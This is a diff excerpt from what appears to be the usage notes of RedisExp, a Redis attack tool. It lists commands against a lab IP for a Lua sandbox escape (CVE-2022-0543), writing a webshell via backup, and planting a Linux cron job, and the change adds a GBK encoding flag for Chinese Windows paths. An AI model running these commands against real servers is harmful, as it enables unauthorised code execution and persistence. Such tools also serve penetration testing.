@@ -30,8 +30,8 @@ RedisExp.exe -rhost 192.168.211.131 -slaveof
 Lua沙盒绕过命令执行 CVE-2022-0543:
 RedisExp.exe -rhost 192.168.211.131 -lua -console
 
-备份写 Webshell:
-RedisExp.exe -rhost 192.168.211.131 -shell
+备份写 Webshell (Windows 中文路径要设置gbk, linux 中文路径不用设置):
+RedisExp.exe -rhost 192.168.211.131 -shell -gbk
 
 Linux 写计划任务:
 RedisExp.exe -rhost 192.168.211.131 -crontab
